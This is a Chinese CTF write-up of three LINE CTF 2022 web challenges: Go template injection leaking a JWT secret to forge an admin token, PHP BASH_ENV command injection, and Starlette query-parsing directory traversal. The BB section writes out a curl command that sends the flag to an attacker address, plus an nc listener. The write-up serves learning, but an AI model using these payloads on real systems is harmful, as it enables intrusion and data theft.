---
tags:
  - ctf
---
# 2022-LineCtf

## gotm

题型:SSTI注入

漏洞原因:GO语言 new_acc := Account{uid, upw, false, secret_key}，get_account(id)

源代码:

```go
package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"text/template"

	"github.com/golang-jwt/jwt"
)

type Account struct {
	id         string
	pw         string
	is_admin   bool
	secret_key string
}

type AccountClaims struct {
	Id       string `json:"id"`
	Is_admin bool   `json:"is_admin"`
	jwt.StandardClaims
}

type Resp struct {
	Status bool   `json:"status"`
	Msg    string `json:"msg"`
}

type TokenResp struct {
	Status bool   `json:"status"`
	Token  string `json:"token"`
}

var acc []Account
var secret_key = os.Getenv("KEY")
var flag = os.Getenv("FLAG")
var admin_id = os.Getenv("ADMIN_ID")
var admin_pw = os.Getenv("ADMIN_PW")

func clear_account() {
	acc = acc[:1]
}

func get_account(uid string) Account {
	for i := range acc {
		if acc[i].id == uid {
			return acc[i]
		}
	}
	return Account{}
}

func jwt_encode(id string, is_admin bool) (string, error) {
	claims := AccountClaims{
		id, is_admin, jwt.StandardClaims{},
	}
	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
	return token.SignedString([]byte(secret_key))
}

func jwt_decode(s string) (string, bool) {
	token, err := jwt.ParseWithClaims(s, &AccountClaims{}, func(token *jwt.Token) (interface{}, error) {
		return []byte(secret_key), nil
	})
	if err != nil {
		fmt.Println(err)
		return "", false
	}
	if claims, ok := token.Claims.(*AccountClaims); ok && token.Valid {
		return claims.Id, claims.Is_admin
	}
	return "", false
}

func auth_handler(w http.ResponseWriter, r *http.Request) {
	uid := r.FormValue("id")
	upw := r.FormValue("pw")
	if uid == "" || upw == "" {
		return
	}
	if len(acc) > 1024 {
		clear_account()
	}
	user_acc := get_account(uid)
	if user_acc.id != "" && user_acc.pw == upw {
		token, err := jwt_encode(user_acc.id, user_acc.is_admin)
		if err != nil {
			return
		}
		p := TokenResp{true, token}
		res, err := json.Marshal(p)
		if err != nil {
		}
		w.Write(res)
		return
	}
	w.WriteHeader(http.StatusForbidden)
	return
}

func regist_handler(w http.ResponseWriter, r *http.Request) {
	uid := r.FormValue("id")
	upw := r.FormValue("pw")

	if uid == "" || upw == "" {
		return
	}

	if get_account(uid).id != "" {
		w.WriteHeader(http.StatusForbidden)
		return
	}
	if len(acc) > 4 {
		clear_account()
	}
	new_acc := Account{uid, upw, false, secret_key}
	acc = append(acc, new_acc)

	p := Resp{true, ""}
	res, err := json.Marshal(p)
	if err != nil {
	}
	w.Write(res)
	return
}

func flag_handler(w http.ResponseWriter, r *http.Request) {
	token := r.Header.Get("X-Token")
	if token != "" {
		id, is_admin := jwt_decode(token)
		if is_admin == true {
			p := Resp{true, "Hi " + id + ", flag is " + flag}
			res, err := json.Marshal(p)
			if err != nil {
			}
			w.Write(res)
			return
		} else {
			w.WriteHeader(http.StatusForbidden)
			return
		}
	}
}

func root_handler(w http.ResponseWriter, r *http.Request) {
	token := r.Header.Get("X-Token")
	if token != "" {
		id, _ := jwt_decode(token)
		acc := get_account(id)
		tpl, err := template.New("").Parse("Logged in as " + acc.id)
		if err != nil {
		}
		tpl.Execute(w, &acc)
	} else {

		return
	}
}

func main() {
	admin := Account{admin_id, admin_pw, true, secret_key}
	acc = append(acc, admin)

	http.HandleFunc("/", root_handler)
	http.HandleFunc("/auth", auth_handler)
	http.HandleFunc("/flag", flag_handler)
	http.HandleFunc("/regist", regist_handler)
	log.Fatal(http.ListenAndServe("0.0.0.0:11000", nil))
}

```

值得注意的是主函数中 定义了每个路由的功能

可以粗略的分为以下几个部分

```go
"/":
//需要http请求中携带X-Token的参数
//获取X-Token的内容 然后通过jwt_decode()函数进行解码获取id
//通过get_account()函数判断是否有该用户 若有 登录成功显示 Logged in as "id"
func root_handler(w http.ResponseWriter, r *http.Request)

"/auth":
//获取http请求中的id pw字段的内容
//进行正常的注册 并把用户信息添加进acc全局变量中
//通过jwt_encode()函数 传入id is_admin 进行jwt加密 [这里的is_admin是F还是T？][按照逻辑来说 除非是admin用户 否则新注册的用户都是F]
//然后会将token的信息返回在页面上
func auth_handler(w http.ResponseWriter, r *http.Request)

"/regist":
//获取http请求中的id pw字段内容
//当一切合法(不为空 不是已有用户 用户总数量不大于4) 添加进用户集{uid, upw, false, secret_key}[is_admin=F]
//然后序列化回显在页面上？
func regist_handler(w http.ResponseWriter, r *http.Request) 

"/flag":
//重中之中 需要突破的点
//获取http请求中X-Token的内容
//进行解码 获取id is_admin的内容
//如果is_admin==T 就直接显示flag
func flag_handler(w http.ResponseWriter, r *http.Request) 
```

看到这里 我们可以知道 想要flag主要是通过访问/flag路由 传递X-Token 让它解码后的is_admin=T

但是有个问题

这里的token如何加密和解密的

一般来说token主要由`header`+`payload`+`signature`组成`signature`是有`header`与`payload`加密后得到

这里代码的`payload`部分应该是

```go
{
    "id":
    "is_admin":
}
```

原因是因为通过GPT分析：

```gpt
jwt.StandardClaims：这一行嵌套了一个类型为 jwt.StandardClaims 的匿名字段（anonymous field）。这表示 AccountClaims 结构体会继承 jwt.StandardClaims 结构体的所有字段和方法。jwt.StandardClaims 是 github.com/dgrijalva/jwt-go 库中的结构体类型，它包含了 JWT 标准声明的字段，如过期时间、发行时间、JWT ID 等。
```

想拿到flag主要还是得想办法让传入的`is_admin`==`True`

注册一个id=a、pw=a的账号

访问\auth 得到token

```go
{"status":true,"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImEiLCJpc19hZG1pbiI6ZmFsc2V9.x4axXAjLwVlpBGrBkaVqw_CltRwNihSXyJMrpmgCmXg"}

//base64解密header.payload
{"alg":"HS256","typ":"JWT"}.{"id":"a","is_admin":false}.x4axXAjLwVlpBGrBkaVqw_CltRwNihSXyJMrpmgCmXg
```

`其实到这里就完全无法进行下去了 只能去查阅wp`

通过查阅WP 提到了一个`SSTI`的东西

模板注入，大致查看了一下 有点类似于flask框架中后端的某个值可以通过`{{id}}`的方式响应给前端

但是具体`SSTI`是什么还得继续查阅资料 做题整明白

在wp中 是创建了一个`id={{.}}`的账号

`访问/regist`

```go
/regist?id={{.}}&pw=a
```

`访问/auth`

```go
/auth?id={{.}}&pw=a
```

响应：

```bp
{"status":true,"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Int7Ln19IiwiaXNfYWRtaW4iOmZhbHNlfQ.0Lz_3fTyhGxWGwZnw3hM_5TzDfrk0oULzLWF4rRfMss"}
```

`访问/`

```bp
GET / HTTP/1.1
Host: 7097a193-bd44-4d46-9ad5-60bb48a68697.node4.buuoj.cn:81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
<!--Accept-Encoding: gzip, deflate--!>
<!--Accept-Language: zh-CN,zh;q=0.9--!>
X-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Int7Ln19IiwiaXNfYWRtaW4iOmZhbHNlfQ.0Lz_3fTyhGxWGwZnw3hM_5TzDfrk0oULzLWF4rRfMss
```

Accept-Encoding: gzip, deflate 浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法（gzip，deflate），（注意：这不是只字符编码）。

Accept-Language:zh-CN,zh;q=0.9 浏览器申明自己接收的语言。

`不知道为什么少了这两个就无法重发了`

响应：

```bp
Logged in as {{{.}} a false this_is_f4Ke_key}
```

通过第一次响应内容和在线的jwt加解密工具可知

```go
header:{
  "alg": "HS256",
  "typ": "JWT"
}

payload:{
  "id": "{{.}}",
  "is_admin": false
}
```

由于用户的数据结构是下列这样

```go
new_acc := Account{uid, upw, false, secret_key}
```

那么返回的数据

```go
{{{.}} a false this_is_f4Ke_key}
```

就可以知道`secret_key`是多少了 通过在线加解密的工具 将密钥添加 false改为true 就能构造出X-Token

这里也许就是模板注入的妙处所在了

传入`{{.}}`作为用户名 被识别成当前的数据类型 按照逻辑来看 `Logged in as` 后面应该只会跟上用户的id 但是由于`{{.}}`模板的介入 后面直接被识别成了`acc`中对应的`id`为`{{.}}`的`Account`变量 并输出出来 让攻击者知道了`secret_key`

构造：

```go
header:{
  "alg": "HS256",
  "typ": "JWT"
}

payload:{
  "id": "{{.}}",
  "is_admin": false
}

secret_key=this_is_f4Ke_key

X-Token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImEiLCJpc19hZG1pbiI6dHJ1ZX0.DIdxTDj9QUWaIOSi-ZVLgRPRoYO9Cxm8ckOqum3AG64
```

## BB

题型:RCE 环境变量提权

漏洞原因:system("bash -c 'imdude'");

```php+HTML
<?php
error_reporting(0);

function bye($s, $ptn)
{
    if (preg_match($ptn, $s)) {
        return false;
    }
    return true;
}

foreach ($_GET["env"] as $k => $v) {
    if (bye($k, "/=/i") && bye($v, "/[a-zA-Z]/i")) {
        putenv("{$k}={$v}");
    }
}
system("bash -c 'imdude'");

foreach ($_GET["env"] as $k => $v) {
    if (bye($k, "/=/i")) {
        putenv("{$k}");
    }
}
highlight_file(__FILE__);
?>
```

代码中主要有两段for循环是关键，而这个func在这里显得比较突兀了

分析代码：

```
function bye($s, $ptn)
//传入 $s $ptn
//$s是被正则的主体，$ptn是正则preg_match()函数的另一个参数
//这个函数主要是为了实现一个正则


//第一个for
foreach ($_GET["env"] as $k => $v)
//通过GET方法传入名为env的数组
//将数组的键 类似于下标的东西 和对应的值进行正则
//满足：下标不能含有= and 对应的值不能含有字母
//符合后执行putenv()

//第二个for
foreach ($_GET["env"] as $k => $v) 
//键值不能含有=

system("bash -c 'imdude'");
//这是执行一个shell指令
//root@root:~# bash -c "command"

putenv()
//putenv("VARNAME=variable_value");
//用于设置环境变量的值
```

综上所述

该代码会将env数组中 名称与键值相同的环境变量 赋值为 数组中键值对应的值

举个例子

```php
env[HACK]=admin
//那么 名为HACK的环境变量会被赋值成admin
```

至于为什么`imdude`会被当成环境变量 就不得而知了

根据WP 这个题的解题思路主要是在`bash -c`的前提下进行打开`flag`

关于不同环境变量的提权：https://tttang.com/archive/1450/#toc_0x06-bash_env

这里可以尝试构造payload

```php
BASH_ENV=cat /flag | curl -d -@ ip:port
```

但是`$v`是过滤了字母的

这里有一个关于linux的特性：

```php
echo $'/167'
=>
w
```

也就是在linux中`$'[八进制]'`会被解析成对应字母

```php
echo $'\143'$'\141'$'\164'
=>
cat
```

可以编写脚本进行任意命令的编码

这个地方有两个问题了：

```php
payload=/?env[BASH_ENV]=`cat /flag | curl -d -@ ip:port`
//[1]为什么curl后的ip只能在公网ip上 按照常理来说应该可以使用个人局域网
//[2]为什么要使用``进行内敛执行
```

使用公网ip的情况下

```php
//需要打开防火墙开放端口
sudo ufw allow <port>
//监听端口
nc -lvnp <port>
```

PHP中system()函数中：

- `BASH_ENV`：可以在`bash -c`的时候注入任意命令
- `ENV`：可以在`sh -i -c`的时候注入任意命令
- `PS1`：可以在`sh`或`bash`交互式环境下执行任意命令
- `PROMPT_COMMAND`：可以在`bash`交互式环境下执行任意命令
- `BASH_FUNC_xxx%%`：可以在`bash -c`或`sh -c`的时候执行任意命令

## Memo Driver

题型:目录遍历

漏洞原因:Starlette框架 request.url.query  传入的值以`;`隔开会导致解析错误

```python
def view(request):
    context = {}

    try:
        context['request'] = request
        clientId = getClientID(request.client.host)
        if '&' in request.url.query or '.' in request.url.query or '.' in unquote(request.query_params[clientId]):
            raise
        filename = request.query_params[clientId]
        path = './memo/' + "".join(request.query_params.keys()) + '/' + filename
        f = open(path, 'r')
        contents = f.readlines()
        f.close()
        
        context['filename'] = filename
        context['contents'] = contents
    
    except:
        pass
    
    return templates.TemplateResponse('/view/view.html', context)
```

`CVE-2021-23336`:https://github.com/encode/starlette/issues/1325

```python
from starlette.testclient import TestClient
from starlette.requests import Request
from starlette.applications import Starlette
from starlette.routing import Route
from starlette.responses import PlainTextResponse

param_value = 'a;b;c'
url = f'/test?param={param_value}'


async def test_route(request: Request):
    # request.url.query = 'param=a;b;c'
    param = request.query_params['param']  
    # param is 'a' 
    # request.query_params.keys() is ['param', 'b', 'c']
    assert param == param_value  # Assertion failed
    return PlainTextResponse(param)


app = Starlette(debug=True, routes=[Route('/test', test_route)])

client = TestClient(app)

response = client.request(url=url, method='GET')
```

`request.query_params.keys()`会获取`request.url.query`中的键

构造payload访问任意目录：

```python
path = './memo/' + "".join(request.query_params.keys()) + '/' + filename

# join(request.query_params.keys()) =  'id' + '/..'

# id 无法破解？
def getClientID(ip):
    # 加盐加密
    key = ip + '_' + os.getenv('SALT')
    # key进行md5哈希值的十六进制
    return hashlib.md5(key.encode('utf-8')).hexdigest()

# 获取键为clientId对应的内容
filename = request.query_params[clientId]
# params[clientId] = 'flag'

=>

# url/?id=flag;/..
path = './memo/id/../flag'
```

有个同框架下类似的漏洞：

`CVE-2023-29159` Starlette目录遍历漏洞

https://github.com/encode/starlette/security/advisories/GHSA-v5gw-mw7f-84px

